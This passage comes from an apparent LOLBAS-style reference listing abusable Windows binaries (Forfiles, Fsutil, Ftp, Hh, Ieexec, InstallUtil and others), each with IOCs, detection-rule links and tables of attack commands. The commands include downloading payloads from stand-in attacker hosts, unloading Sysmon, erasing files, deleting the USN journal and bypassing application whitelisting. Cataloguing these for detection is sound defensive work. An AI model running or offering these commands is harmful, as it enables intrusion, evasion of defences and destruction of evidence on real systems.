| **Tamper** | `T1562.001` | `Admin` | `fltMC.exe unload SysmonDrv` | Defense evasion |

### `Forfiles.exe` (`yml/OSBinaries/Forfiles.yml`)
- **Description:** Selects and executes a command on a file or set of files. This command is useful for batch processing.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Forfiles.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Forfiles.yml`
- **Default Windows Paths:** `C:\Windows\System32\forfiles.exe`, `C:\Windows\SysWOW64\forfiles.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_forfiles.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe` | Use forfiles to start a new process to evade defensive counter measures |
| **ADS** | `T1564.004` | `User` | `forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"` | Use forfiles to start a new process from a binary hidden in an alternate data stream |

### `Fsutil.exe` (`yml/OSBinaries/Fsutil.yml`)
- **Description:** File System Utility
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Fsutil.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Fsutil.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Fsutil.yml`
- **Default Windows Paths:** `C:\Windows\System32\fsutil.exe`, `C:\Windows\SysWOW64\fsutil.exe`
- **Key Forensic / Hunt IOCs:** `fsutil.exe should not be run on a normal workstation`; `file setZeroData (not case-sensitive) in the process arguments`; `Sysmon Event ID 1`; `Execution of process fsutil.exe with trace decode could be suspicious`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_susp_fsutil_usage.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Tamper** | `T1485` | `User` | `fsutil.exe file setZeroData offset=0 length=9999999999 C:\Windows\Temp\payload.dll` | Can be used to forensically erase a file |
| **Tamper** | `T1485` | `User` | `fsutil.exe usn deletejournal /d c:` | Can be used to hide file creation activity |
| **Execute** | `T1218` | `User` | `fsutil.exe trace decode` | Spawn a pre-planted executable from fsutil.exe. |

### `Ftp.exe` (`yml/OSBinaries/Ftp.yml`)
- **Description:** A binary designed for connecting to FTP servers
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Ftp.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Ftp.yml`
- **Default Windows Paths:** `C:\Windows\System32\ftp.exe`, `C:\Windows\SysWOW64\ftp.exe`
- **Key Forensic / Hunt IOCs:** `cmd /c as child process of ftp.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ftp.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1202` | `User` | `echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt` | Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand |
| **Download** | `T1105` | `User` | `cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"` | Spawn new process using ftp.exe. Ftp.exe downloads the binary. |

### `Gpscript.exe` (`yml/OSBinaries/Gpscript.yml`)
- **Description:** Used by group policy to process scripts
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Gpscript.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Gpscript.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Gpscript.yml`
- **Default Windows Paths:** `C:\Windows\System32\gpscript.exe`, `C:\Windows\SysWOW64\gpscript.exe`
- **Key Forensic / Hunt IOCs:** `Scripts added in local group policy`; `Execution of Gpscript.exe after logon`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_gpscript.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `Administrator` | `Gpscript /logon` | Add local group policy logon script to execute file and hide from defensive counter measures |
| **Execute** | `T1218` | `Administrator` | `Gpscript /startup` | Add local group policy logon script to execute file and hide from defensive counter measures |

### `Hh.exe` (`yml/OSBinaries/Hh.yml`)
- **Description:** Binary used for processing chm files in Windows
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Hh.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Hh.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Hh.yml`
- **Default Windows Paths:** `C:\Windows\hh.exe`, `C:\Windows\SysWOW64\hh.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_chm_execution.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml), [Elastic](https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/execution_via_compiled_html_file.toml), [Elastic](https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/execution_html_help_executable_program_connecting_to_the_internet.toml), [Splunk](https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_html_help_spawn_child_process.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `HH.exe http://some.url/script.ps1` | Download files from url |
| **Execute** | `T1218.001` | `User` | `HH.exe c:\windows\system32\calc.exe` | Execute process with HH.exe |

### `IMEWDBLD.exe` (`yml/OSBinaries/IMEWDBLD.yml`)
- **Description:** Microsoft IME Open Extended Dictionary Module
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/IMEWDBLD.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/IMEWDBLD.yml`
- **Default Windows Paths:** `C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw` | Download file from Internet |

### `Ie4uinit.exe` (`yml/OSBinaries/Ie4uinit.yml`)
- **Description:** Executes commands from a specially prepared ie4uinit.inf file.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Ie4uinit.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Ie4uinit.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Ie4uinit.yml`
- **Default Windows Paths:** `c:\windows\system32\ie4uinit.exe`, `c:\windows\sysWOW64\ie4uinit.exe`, `c:\windows\system32\ieuinit.inf`, `c:\windows\sysWOW64\ieuinit.inf`
- **Key Forensic / Hunt IOCs:** `ie4uinit.exe copied outside of %windir%`; `ie4uinit.exe loading an inf file (ieuinit.inf) from outside %windir%`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/process_creation/proc_creation_win_lolbin_ie4uinit.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `ie4uinit.exe -BaseSettings` | Get code execution by copy files to another location |

### `iediagcmd.exe` (`yml/OSBinaries/Iediagcmd.yml`)
- **Description:** Diagnostics Utility for Internet Explorer
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Iediagcmd.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Iediagcmd.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Iediagcmd.yml`
- **Default Windows Paths:** `C:\Program Files\Internet Explorer\iediagcmd.exe`
- **Key Forensic / Hunt IOCs:** `Sysmon Event ID 1`; `Execution of process iediagcmd.exe with /out could be suspicious`
- **Detection Rules:** [Sigma](https://github.com/manasmbellani/mycode_public/blob/master/sigma/rules/win_proc_creation_lolbin_iediagcmd.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `set windir=c:\test& cd "C:\Program Files\Internet Explorer\" & iediagcmd.exe /out:c:\test\foo.cab` | Spawn a pre-planted executable from iediagcmd.exe. |

### `Ieexec.exe` (`yml/OSBinaries/Ieexec.yml`)
- **Description:** The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Ieexec.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Ieexec.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Ieexec.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe`, `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe`
- **Key Forensic / Hunt IOCs:** `Network connections originating from ieexec.exe may be suspicious`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_ieexec_download.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml), [Elastic](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_misc_lolbin_connecting_to_the_internet.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `ieexec.exe http://x.x.x.x:8080/bypass.exe` | Download and run attacker code from remote location |
| **Execute** | `T1218` | `User` | `ieexec.exe http://x.x.x.x:8080/bypass.exe` | Download and run attacker code from remote location |

### `Ilasm.exe` (`yml/OSBinaries/Ilasm.yml`)
- **Description:** used for compile c# code into dll or exe.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Ilasm.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Ilasm.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Ilasm.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe`, `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe`
- **Key Forensic / Hunt IOCs:** `Ilasm may not be used often in production environments (such as on endpoints)`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/process_creation/proc_creation_win_lolbin_ilasm.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Compile** | `T1127` | `User` | `ilasm.exe C:\public\test.txt /exe` | Compile attacker code on system. Bypass defensive counter measures. |
| **Compile** | `T1127` | `User` | `ilasm.exe C:\public\test.txt /dll` | A description of the usecase |

### `Infdefaultinstall.exe` (`yml/OSBinaries/Infdefaultinstall.yml`)
- **Description:** Binary used to perform installation based on content inside inf files
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Infdefaultinstall.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Infdefaultinstall.yml`
- **Default Windows Paths:** `C:\Windows\System32\Infdefaultinstall.exe`, `C:\Windows\SysWOW64\Infdefaultinstall.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_infdefaultinstall_execute_sct_scripts.yml), [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `Admin` | `InfDefaultInstall.exe Infdefaultinstall.inf` | Code execution |

### `Installutil.exe` (`yml/OSBinaries/Installutil.yml`)
- **Description:** The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Installutil.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Installutil.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Installutil.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe`, `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe`, `C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe`, `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_installutil_download.yml), [Elastic](https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1218.004` | `User` | `InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll` | Use to execute code and bypass application whitelisting |
| **Execute** | `T1218.004` | `User` | `InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll` | Use to execute code and bypass application whitelisting |
| **Download** | `T1105` | `User` | `InstallUtil.exe https://example.com/payload` | Downloads payload from remote server |

### `Jsc.exe` (`yml/OSBinaries/Jsc.yml`)
- **Description:** Binary file used by .NET to compile JavaScript code to .exe or .dll format
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Jsc.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Jsc.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Jsc.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Jsc.exe`, `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Jsc.exe`, `C:\Windows\Microsoft.NET\Framework\v2.0.50727\Jsc.exe`, `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Jsc.exe`
- **Key Forensic / Hunt IOCs:** `Jsc.exe should normally not run a system unless it is used for development.`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_lolbin_jsc.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Compile** | `T1127` | `User` | `jsc.exe scriptfile.js` | Compile attacker code on system. Bypass defensive counter measures. |
| **Compile** | `T1127` | `User` | `jsc.exe /t:library Library.js` | Compile attacker code on system. Bypass defensive counter measures. |

### `Ldifde.exe` (`yml/OSBinaries/Ldifde.yml`)
- **Description:** Creates, modifies, and deletes LDAP directory objects.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Ldifde.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Ldifde.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Ldifde.yml`
- **Default Windows Paths:** `c:\windows\system32\ldifde.exe`, `c:\windows\syswow64\ldifde.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_export.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_file_load.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules-emerging-threats/2019/TA/APT31/proc_creation_win_apt_apt31_judgement_panda.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `Administrator` | `Ldifde -i -f inputfile.ldf` | Download file from Internet |

